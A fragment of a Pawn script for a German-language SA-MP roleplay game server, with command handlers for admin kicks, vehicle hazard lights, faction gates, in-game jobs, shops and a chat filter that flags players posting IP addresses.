						if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
						{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht kicken, da er ein höheres Adminlevel hat als du!");
							return 1;
						}
			    		if(IsASkrupy(giveplayerid))
	  		   			{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht kicken, da er der Owner ist!");
							return 1;
						}
						new year, month,day;
						getdate(year, month, day);
						format(string, sizeof(string), "AdmCmd: %s wurde von %s gekickt, Grund: %s (%d-%d-%d)", giveplayer, sendername, (result),month,day,year);
						KickLog(string);
						format(string, sizeof(string), "AdmCmd: %s wurde von %s gekickt, Grund: %s", giveplayer, sendername, (result));
						SendClientMessageToAll(COLOR_LIGHTRED, string);
						Kick(giveplayerid);
						return 1;
					}
				}
			}
			else
			{
				format(string, sizeof(string), "   %d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
*/
if(strcmp(cmdtext, "/warnblinker", true) == 0)
{
    /*
        Das Warnblinkersystem stellt ein fahrzeugsorientierte Warnsystem bereit.

    */
    if(IsPlayerInAnyVehicle(playerid)) // Wenn Spieler in einem Fahrzeug ist (kann erweitert werden z.B. wenn es kein Bike ist etc...)
    {
	    if(GetPlayerState(playerid)==PLAYER_STATE_DRIVER) // Spieler muss Fahrer sein. Kann auch weggelassen werden (Da Beifahrer ja auch den Warnblinker anmachen können)
	    {
	        if(toggle_switcher[GetPlayerVehicleID(playerid)] == 0) // Der Switcher, der zwischen an und aus switcht. Unterschieden wird anhand der VehicleID
			{
	    		warn_timer[GetPlayerVehicleID(playerid)] = SetTimerEx("vehicleWarnlight", 500, 1, "i",GetPlayerVehicleID(playerid)); // Der Timer warn_timer ruft alle 500 millisekunden wiederholend die Funktion vehicleWarnlight auf und gibt die VehicleID über
	    		toggle_switcher[GetPlayerVehicleID(playerid)] = 1; // Der Switcher wird umgeschaltet
	    		SendClientMessage(playerid, COLOR_LIGHTBLUE, "[Gerry Scripts]Warnblinker eingeschaltet"); // Output an Player
	    	}
	    	else
	    	{
                toggle_switcher[GetPlayerVehicleID(playerid)] = 0; // Der Switcher wird umgeschaltet
                KillTimer(warn_timer[GetPlayerVehicleID(playerid)]); // Timer wird gestoppt
			    DestroyObject(objekt1[GetPlayerVehicleID(playerid)]); // Objekte am Auto werden gelöscht
		 	    DestroyObject(objekt2[GetPlayerVehicleID(playerid)]);
		 	    DestroyObject(objekt3[GetPlayerVehicleID(playerid)]);
			    DestroyObject(objekt4[GetPlayerVehicleID(playerid)]);
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "[Gerry Scripts]Warnblinker ausgeschaltet"); // Output an Player
			}
	    }
	}
    return 1;
}












    printf("[cmd] %s(%d): %s", GetName(playerid), playerid, cmdtext);


	new lastidx = (strlen(cmdtext) - 1);
	if(cmdtext[lastidx] == '.')
	    cmdtext[lastidx] = ' ';

	new countit = 0;
	for(new x=0; x<strlen(cmdtext); x++)
	{
		if(cmdtext[x] == '.' && cmdtext[x+1] <= '9' && cmdtext[x+1] >= '0') // Es wurde ein Punkt und eine Zahl dahinter geschrieben!
		{
		    countit++;
		}
		else if(cmdtext[x] == '.' && cmdtext[x+2] <= '9' && cmdtext[x+2] >= '0') // Es wurde ein Punkt, Leerzeichen und eine Zahl dahinter geschrieben!
		{
		    countit++;
		}
	}
	if(countit >= 3 && PlayerInfo[playerid][pAdmin] <1) // Dreimal und eine IP wird erkannt











	if(strfind(cmdtext,"5.135.112.217:4021",true) != 0) // NICHT die TS-IP
	if(strfind(cmdtext,"5.135.112.217:4021",true) != 0)
	{
		new textstring[128], name[MAX_PLAYER_NAME];
		GetPlayerName(playerid,name,sizeof(name));
		format(textstring,sizeof(textstring),"AdmWarning %s wird verdächtigt eine IP zu verschicken!",name);
			ABroadCast(COLOR_LIGHTRED,textstring,1);
		format(textstring,sizeof(textstring),"AdmWarning %s: %s",name,cmdtext);
			ABroadCast(COLOR_LIGHTRED,textstring,1);
		SendClientMessage(playerid,COLOR_RED,"Es ist nicht erlaubt IPs in den Chat zu Schreiben!");
		gPlayerAbwerbeTrys[playerid]++;
		if(gPlayerAbwerbeTrys[playerid] >= 3)//{ad3031}%s wurde von %s gebannt, Grund: %s
		{
		    format(textstring,sizeof(textstring),"%s wurde vom Server gekickt, Grund: Abwerbe",name);
		    SendClientMessageToAll(COLOR_RED,textstring);
        	SetTimerEx("kicktimerfake", 100,false,"i",playerid);
		}
		return 1;
	}
     if (strcmp("/htornew2", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
     {
   		if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8)
		{
        MoveObject(htornew1, 2424.13770, 64.17750, 26.49200,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
        SetTimer("htornew1close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
        MoveObject(htornew2, 2424.12988, 49.68580, 26.49200,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
        SetTimer("htornew2close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Hitman!");
 		return 1;
	}




//3
     if (strcmp("/garki", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
     {
	   	if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
		{
		    if (IsPlayerInRangeOfPoint(playerid, 25.0, 785.31372, -1152.43372, 19.71013))
		    {
	        MoveObject(terrorgate631, 785.31372, -1152.43372, 19.71013,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
	        SetTimer("terrorgate631close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
			}
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Terorist!");
 		return 1;
	}


//2
     if (strcmp("/amki3", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
     {
	   	if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
		{
		    if (IsPlayerInRangeOfPoint(playerid, 7.0, 659.0154,-1227.0751,16.1319))
		    {
	        MoveObject(terrorgate532, 660.07465, -1227.42554, 11.95123,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
	        SetTimer("terrorgate532close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
			}
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Terrorist!");
 		return 1;
	}





//1
     if (strcmp("/terrorgate77", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
     {
	   	if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
		{
		    if (IsPlayerInRangeOfPoint(playerid, 7.0, 664.6283,-1308.8994,13.4609))
		    {
	        MoveObject(terrotgate772, 664.93164, -1309.73682, 9.57681,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
	        SetTimer("terrotgate772close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
			}
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Terrorist!");
 		return 1;
	}







     if (strcmp("/otor1", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
     {
   		if(PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pLeader] == 24)
		{
		if(IsObjectMoving(otor2))
		{
 		return 1;
		}
        MoveDynamicObject(otor1, 923.48230, -1216.51563, 13.08287,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
        SetTimer("otor1close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
        MoveDynamicObject(otor2, 923.47284, -1225.36877, 13.08251,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
		}
 		return 1;
	}
	if(strcmp(cmdtext, "/createpickup", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] >= 1338)
	        {
       			ShowPlayerDialog(playerid, DIALOG_PICKUP, DIALOG_STYLE_LIST, "Pickups", "Healpickup\nDeaglepickup\nSpawnpickup\nArmour Pickup\nHealpickup Entfernen\nDeaglepickup Entfernen\nSpawnpickup Entfernen\nArmourpickup Entfernen", "Auswählen", "Abbrechen");
			}
		}
		return 1;
	}
    if(strcmp(cmdtext,"/saveall", true) == 0)
	{
        if(IsPlayerConnected(playerid))
		{
            if(PlayerInfo[playerid][pAdmin] >= 6)
			{
                SaveAllAccs();
                SCM(playerid,COLOR_RED,"Spieler Accounts gespeichert ...");
			}
			else
			{
			    SCM(playerid,COLOR_RED,"Dir fehlen die nötigen Rechte dazu");
			}
        }
        return 1;
	}
	if(strcmp(cmdtext, "/clothes", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			  if(IsAtClothShop(playerid))
			  {
                    if(PlayerInfo[playerid][sMember] == 0)
                    {
	                    SkinStatus[playerid] = playerid;
	                    SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
				        SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
				        SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
			        	SetPlayerFacingAngle(playerid, 88.4779);
					    FreezePlayer(playerid);
		        	    SetPlayerInterior(playerid, 0);
					    SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
	 				    SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
						SetPlayerVirtualWorld(playerid, 3);
                    }
                    else if(PlayerInfo[playerid][sMember] >= 1)
                    {
	                    SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
				        SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
				        SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
			            SetPlayerFacingAngle(playerid, 88.4779);
						SelectChar[playerid] = 255;
						SelectCharID[playerid] = PlayerInfo[playerid][sMember];
						SelectCharPlace[playerid] = 1;
						PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
						PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
					    FreezePlayer(playerid);
		        	    SetPlayerInterior(playerid, 0);
					    SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
	 				    SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
						SetPlayerVirtualWorld(playerid, 3);
					}
				}
			}
		return 1;
	}
	if(strcmp(cmdtext, "/messages", true) == 0)
	{
				if(PlayerInfo[playerid][pMeldung] == 1)
				{
                PlayerInfo[playerid][pMeldung] = 0;
                SendClientMessage(playerid, COLOR_DBLUE,"Verbindungsnachrichten deakiviert!");
				}
				else if(PlayerInfo[playerid][pMeldung] == 0)
				{
                PlayerInfo[playerid][pMeldung] = 1;
                SendClientMessage(playerid, COLOR_DBLUE,"Verbindungsnachrichten aktiviert!");
				}

		return 1;
	}
	if(strcmp(cmdtext, "/hitsound", true) == 0)
	{
		if(PlayerInfo[playerid][pHitsound] == 0)
		{
            PlayerInfo[playerid][pHitsound] = 1;
            SendClientMessage(playerid, COLOR_DBLUE,"Hitsound aktiviert!");
		}
		else if (PlayerInfo[playerid][pHitsound] == 1)
		{
            PlayerInfo[playerid][pHitsound] = 0;
            SendClientMessage(playerid, COLOR_DBLUE,"Hitsound deaktiviert!");
		}
		return 1;
	}
    if (strcmp("/Link", cmdtext, true) == 0)
	{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
	LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(playerid));
	}
	return 1;
	}
/*
	if(strcmp(cmdtext,"/restart", true) == 0)
    {
	    if(PlayerInfo[playerid][pAdmin] >= 2002)
	    {
		    SetTimer("Restart1",1000,0);
		    return 1;
	    }
    }
*/
/*
	if(strcmp(cmdtext,"/fahrrad",true) == 0)
	{
	     if(!IsPlayerInRangeOfPoint(playerid, 2.0,1771.5807,-1895.8499,13.5545)) return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht am Fahrradverleih(Zivispawn)");
		if(GetPVarInt(playerid, "NewbRoller") != 0)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE,"Du hast bereits ein Fahrrad!");
		}
		else
		{
		GivePlayerMoneySave(playerid, -250);
		SetPVarInt(playerid, "NewbRoller", 1);
		NewbRoller[playerid] = CreateVehicle(481,1771.5807,-1895.8499,13.5545,1,1,1,-1, 0);
		return 1;
		}
	}
*/

	if(strcmp(cmdtext,"/kanister",true) == 0)
    {
				for(new b = 0; b < sizeof(TankeInfo); b++)
				{
					if(IsPlayerInRangeOfPoint(playerid,25.0, TankeInfo[b][tEntranceX], TankeInfo[b][tEntranceY], TankeInfo[b][tEntranceZ]))
					{
					    if(PlayerInfo[playerid][pFuel] <= 0)
						{
	              			if(GetPlayerMoneySave(playerid) < 1500)
	              			{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du hast zu wenig Geld 250$!");
							return 1;
							}
						    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast dir einen Kanister gekauft!.");
						    PlayerInfo[playerid][pFuel] = 1;
							GivePlayerMoneySave(playerid, -1500);
							TankeInfo[b][tProducts] -= 15;
							TankeInfo[b][tTill] += 1500;
//							TankeInfo[b][tExtortion] += 15;
							OnPropUpdate_t(b);
							return 1;
						}
						else
						{
							SendClientMessage(playerid,COLOR_GRAD2,"Du hast bereits einen Kanister");
						}
					}
				}
	return 1;
    }
	if(strcmp(cmdtext,"/flug", true) == 0)
    {
        if(PlayerInfo[playerid][pJob] == 10)
	    {
	    new tmpcar = GetPlayerVehicleID(playerid);
        if(GetVehicleModel(tmpcar) == 553||GetVehicleModel(tmpcar) == 511)
        {
            PlayerInfo[playerid][Haltestelle]=0;
			SetPlayerCheckpoint(playerid,2046.7963,-2593.2656,13.5469,6.0);
        	SendClientMessage(playerid,COLOR_LIGHTBLUE,"Fahre nun zur Startbahn.");
			FlugCheckpoint[playerid]=1;
        }
        else
        {
        SendClientMessage(playerid,COLOR_RED,"Du bist nicht im richtigem Flugzeug");
        }
	}
    else
    {
    SendClientMessage(playerid,COLOR_RED,"Du bist kein Pilot");
    }
	return 1;
    }
	if(strcmp(cmdtext,"/linie", true) == 0)
    {
	    if(PlayerInfo[playerid][pJob] == 14)
	    {
		    new tmpcar = GetPlayerVehicleID(playerid);
		    if(GetVehicleModel(tmpcar) == 431 || GetVehicleModel(tmpcar) == 437 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
		    {
			ShowPlayerDialog(playerid,DIALOG_Buslinien,DIALOG_STYLE_LIST,"Buslinien","LS-Stadtlinie 1\nLS-Stadtlinie 2\nSchließen","Wählen","");
    		return 1;
    		}
    		else
 			{
  		    SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinen Bus!");
   			}
    	}
    }
    new string[256];
	if(strcmp(cmdtext,"/start", true) == 0)
    {
    if(PlayerInfo[playerid][pJob]==3)
    {
    new tmpcar = GetPlayerVehicleID(playerid);
    if(GetVehicleModel(tmpcar) == 538 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	if(IsPlayerInRangeOfPoint(playerid,30,1394.2637,2632.2500,12.1256))
    {
	if(ZUGCheckpoint[playerid]==0)
	{
	ZUGCheckpoint[playerid]=1;
    SendClientMessage(playerid,COLOR_GREEN,"Sie haben die Zugroute gestartet.");
    SetPlayerCheckpoint(playerid,1449.2139,2632.2500,12.1256,6.0);
	}
	else
	{
	    SendClientMessage(playerid,COLOR_RED,"Sie können nicht erneu Zug fahren ihre Pause ist noch nicht vorbei");
	}
	}
    else
    {
    SendClientMessage(playerid,COLOR_RED,"Sie müssen in LV Nord Bahnhof sein.");
    }
    }
    else
    {
    SendClientMessage(playerid,COLOR_RED,"Sie in keinem Zug.");
    }
    }
    else
    {
    SendClientMessage(playerid,COLOR_RED,"Sie sind kein Zugfahrer.");
    }
	return 1;
    }

	if (strcmp("/zollcontrol", cmdtext, true, 10) == 0)
    {
    if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pLeader] == 24)//return SendClientMessage(playerid, COLOR_GREY, "Du bist kein Beamter");

	ShowPlayerDialog(playerid, DIALOG_ZOLLCONTROL, DIALOG_STYLE_LIST, "Zollkontrolle", "1. Zoll ID eingeben\n2. LS-SF Zölle auf-/abschliessen\n3. LS-LV Zölle auf-/abschliessen\n4. SF-LV Zölle auf-/abschliessen", "Wählen", "Abbrechen");
	return 1;
    }
/*
	if (strcmp("/tote", cmdtext, true, 10) == 0)
    {
		if (PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)
		{
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i) && PlayerInfo[i][pTot] == 1)
				{
					new mvstring[800];
					format(mvstring,800,"Spieler: %s",mvstring);
					ShowPlayerDialog(playerid,DIALOG_TOTE,DIALOG_STYLE_LIST,"Todesliste",GetName(i),"Auswählen","Abbrechen");
				}
			}
		}
	return 1;
	}
*/
/*
        new string[256];
	    if(strcmp(cmdtext, "/wiederbeleben", true) == 0 || strcmp(cmdtext, "/rea", true) == 0 || strcmp(cmdtext, "/reanimieren", true) == 0)
	    {
		if(IsPlayerConnected(playerid))
		{
			if (PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)
			{
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i) && PlayerInfo[i][pTot] == 1 && IsPlayerInRangeOfPoint(playerid,5.0,PlayerInfo[i][pPos_x],PlayerInfo[i][pPos_y],PlayerInfo[i][pPos_z]))
					{
						new pname[256];
						GetPlayerName(i, pname, 256);
//						ApplyAnimation(playerid,"MEDIC","CPS",4.0,0,1,1,1,5000,1);
						GameTextForPlayer(playerid, "2500$ erhalten", 2000, 1);
						format(string, 256, "** Du hast %s wiederbelebt **",pname);
						SendClientMessage(playerid, COLOR_ALLDEPT, string);
						GetPlayerName(playerid, pname, 256);
						format(string, 256, "** Sanitäter %s hat dich wiederbelebt **",pname);
						SendClientMessage(i, COLOR_ALLDEPT, string);
						GivePlayerMoneySave(playerid, 2500);
						PlayerInfo[i][pTot] = 0;
                        PlayerInfo[i][pTotTime] = 0;
//						pIstTot[i] = 0;
//						SetPlayerInterior(i,GetPlayerInterior(playerid));
//						SetPlayerPos(i,PlayerInfo[i][pTx],PlayerInfo[i][pTy],PlayerInfo[i][pTz]);
						SetCameraBehindPlayer(i);
//						Delete3DTextLabel(DeathText[i]);

						RemoveIcon(i);


//						DestroyPickup(TotenKopf[i]);
                        UnFreezePlayer(i);
						PlayerInfo[i][pTx] = 0.0;
						PlayerInfo[i][pTy] = 0.0;
						PlayerInfo[i][pTz] = 0.0;
//						new Float:tempheal;
//						GetPlayerHealth(i,tempheal);
//						SetPlayerHealth(i,100.0);
						SetPlayerSpawn(i);
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, " Du bist kein Sanitäter!");
			}
		}
		return 1;
	    }


	    */



/*
    	if(strcmp(cmdtext, "/dachsirene", true) == 0)
		{
	        if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4 || PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pLeader] == 24)
	        {
				if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
				{
				    if(sanisirene[GetPlayerVehicleID(playerid)] == 0)
				    {
						sanisirene1[GetPlayerVehicleID(playerid)] = CreateDynamicObject(19419,0,0,-1000,0,0,0,100);
						AttachDynamicObjectToVehicle(sanisirene1[GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.000000,-0.150000,0.824999,0.000000,0.000000,0.000000);
						GameTextForPlayer(playerid,"~r~Sirene Instaliert",5000, 1);
                        sanisirene[GetPlayerVehicleID(playerid)] = 1;
					}
					else if(sanisirene[GetPlayerVehicleID(playerid)] == 1)
					{
						DestroyDynamicObject(sanisirene1[GetPlayerVehicleID(playerid)]);
						sanisirene[GetPlayerVehicleID(playerid)] = 0;
					}
				}
			}
			return 1;
		}
*/
    	if(strcmp(cmdtext, "/uclight", true) == 0)
		{
  			if(IsACop(playerid))
			{
				if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
				{
				    if(fbisirene[GetPlayerVehicleID(playerid)] == 0)
				    {
						fbisirene1[GetPlayerVehicleID(playerid)] = CreateDynamicObject(19797,0,0,-1000,0,0,0,100);
                        fbisirene2[GetPlayerVehicleID(playerid)] = CreateDynamicObject(19797,0,0,-1000,0,0,0,100);
						AttachDynamicObjectToVehicle(fbisirene1[GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.449999,-1.125000,0.599999,-59.400009,0.000000,0.000000);
                        AttachDynamicObjectToVehicle(fbisirene2[GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), -0.449999,-1.125000,0.599999,-59.400009,0.000000,0.000000);
						GameTextForPlayer(playerid,"~r~Sirene an",5000, 1);
                        fbisirene[GetPlayerVehicleID(playerid)] = 1;
					}
					else if(fbisirene[GetPlayerVehicleID(playerid)] == 1)
					{
						DestroyDynamicObject(fbisirene1[GetPlayerVehicleID(playerid)]);
                        DestroyDynamicObject(fbisirene2[GetPlayerVehicleID(playerid)]);
						fbisirene[GetPlayerVehicleID(playerid)] = 0;
					}
				}
			}
			return 1;
		}

	if(strcmp(cmdtext,"/buy",true)==0)
	{
        if(PlayerInfo[playerid][pBizID] == 4)//3 bis 5
        {
		    if(IsPlayerInRangeOfPoint(playerid,55.0,-2.4262,-17.5375,1003.5494))
			{
	        ShowPlayerDialog(playerid, DIALOG_BUY, DIALOG_STYLE_LIST, "24/7", "Zollpass\nNeue Handynummer\nMotoradhelm\nFeuerlöscher", "Auswählen", "Abbrechen");
			}
		}
		return 1;
	}
	if(strcmp(cmdtext,"/mv",true)==0)
	{
        if(IsPlayerInRangeOfPoint(playerid,25.0,2424.6873,54.2187,26.4564))
		{
			OnPlayerCommandText(playerid,"/htornew2");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,1068.40,-1622.04,15.10))
		{
			OnPlayerCommandText(playerid,"/banktor");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,2335.3582,2443.4690,5.8269))
		{
			OnPlayerCommandText(playerid,"/lvpdtor");
		}
	    if(IsPlayerInRangeOfPoint(playerid,15.0,1284.4850,-1652.2684,13.5469))
		{
			OnPlayerCommandText(playerid,"/mwtor");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,1588.6610,-1638.5031,13.37955))
		{
			OnPlayerCommandText(playerid,"/pd1");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,1545.2229,-1627.4520,13.3828))
		{
			OnPlayerCommandText(playerid,"/pd2");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,2088.5112,1433.6021,10.8125))
		{
			OnPlayerCommandText(playerid,"/rtor2");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,2106.6528,1384.7369,10.8203))
		{
			OnPlayerCommandText(playerid,"/rtor1");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,2605.8357,2302.9019,10.8203))
		{
			OnPlayerCommandText(playerid,"/lcntor");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,-2655.1680,-222.4467,4.3098))
		{
			OnPlayerCommandText(playerid,"/fixedtor");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,-2803.0298,-329.6017,7.0391))
		{
			OnPlayerCommandText(playerid,"/triadentor");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,321.2958,-1188.4626,76.3473))
		{
			OnPlayerCommandText(playerid,"/haustor");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,-489.8557,-563.2194,25.3642))
		{
			OnPlayerCommandText(playerid,"/whtor");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,135.0916,1941.1619,19.3144))
		{
			OnPlayerCommandText(playerid,"/bwtor1");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,286.3394,1821.4331,17.6406))
		{
			OnPlayerCommandText(playerid,"/bwtor2");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,282.5451,-1320.1892,53.8568))
		{
			OnPlayerCommandText(playerid,"/haustor2");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,999.36078,-645.45374,120.85107))
		{
			OnPlayerCommandText(playerid,"/gateamk");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,1881.3075,701.9736,10.8203))
		{
			OnPlayerCommandText(playerid,"/htor");
		}
        if(IsPlayerInRangeOfPoint(playerid,5.0,239.9216,117.4937,1003.2257))
		{
			OnPlayerCommandText(playerid,"/pdd1");
		}
        if(IsPlayerInRangeOfPoint(playerid,5.0,252.8763,109.0557,1003.2188))
		{
			OnPlayerCommandText(playerid,"/pdd2");
		}
        if(IsPlayerInRangeOfPoint(playerid,5.0,1729.9117,-1141.9672,24.0859))
		{
			OnPlayerCommandText(playerid,"/fbitor");
		}
        if(IsPlayerInRangeOfPoint(playerid,10.0,2259.4753,2033.8008,10.8203))
		{
			OnPlayerCommandText(playerid,"/otor");
		}
        if(IsPlayerInRangeOfPoint(playerid,5.0,-299.1670,1507.9832,75.3594))
		{
			OnPlayerCommandText(playerid,"/newschranke");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,-1701.8346,684.1790,24.8906))
		{
			OnPlayerCommandText(playerid,"/schranke1");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,-1572.2925,662.0039,7.1875))
		{
			OnPlayerCommandText(playerid,"/schranke2");
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,-1631.5281,688.0742,7.1875))
		{
			OnPlayerCommandText(playerid,"/fbi");
		}
	    if(IsPlayerInRangeOfPoint(playerid,15.0,246.32, 72.97, 1003.64))
		{
			OnPlayerCommandText(playerid,"/lspdtor");
		}
	    if(IsPlayerInRangeOfPoint(playerid,15.0,923.48230, -1216.51563, 18.70460))
		{
			OnPlayerCommandText(playerid,"/otor1");
		}

		if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
		{
			if (IsPlayerInRangeOfPoint(playerid, 25.0, 785.31372, -1152.43372, 19.71013))
				    {
			        MoveObject(terrorgate631, 785.31372, -1152.43372, 19.71013,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
			        SetTimer("terrorgate631close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
					}
			if (IsPlayerInRangeOfPoint(playerid, 7.0, 659.0154,-1227.0751,16.1319))
				    {
			        MoveObject(terrorgate532, 660.07465, -1227.42554, 11.95123,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
			        SetTimer("terrorgate532close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
					}
			if (IsPlayerInRangeOfPoint(playerid, 7.0, 664.6283,-1308.8994,13.4609))
				    {
			        MoveObject(terrotgate772, 664.93164, -1309.73682, 9.57681,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
			        SetTimer("terrotgate772close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
					}
		}





    new Float:x, Float:y, Float:z;

    // Use GetPlayerPos, passing the 3 float variables we just created
    GetPlayerPos(playerid, x, y, z);





	if(IsPlayerInRangeOfPoint(playerid,5,1715.40,-1142.40,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15 || PlayerInfo[playerid][sMember] == 4)
        {
		if(torstatus[78] == 0)
		{
			MoveDynamicObject(tor[78],1715.40,-1142.40,25.10 + 5,1);
			torstatus[78] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[78],1715.40,-1142.40,25.10,1);
		torstatus[78] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
	if(IsPlayerInRangeOfPoint(playerid,5,1709.60,-1142.40,25.10))
	{
        if(PlayerInfo[playerid][sMember] == 15|| PlayerInfo[playerid][sMember] == 4)
        {
		if(torstatus[79] == 0)
		{
			MoveDynamicObject(tor[79],1709.60,-1142.40,25.10 + 5,1);
			torstatus[79] = 1;
            //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
			return 1;
		}
		else
		{
		MoveDynamicObject(tor[79],1709.60,-1142.40,25.10,1);
		torstatus[79] = 0;
        //PlayerHearMusicInRange(x,y,z,1035,5,1,500);//x,y,z,soundid,radius,timer an = 1 wenn aus = 0,zeit wann timer music/sound beendet
		return 1;
		}
		}
		return SendClientMessage(playerid,COLOR_GREY,"Du bist nicht in der jeweiligen Fraktion.");
	}
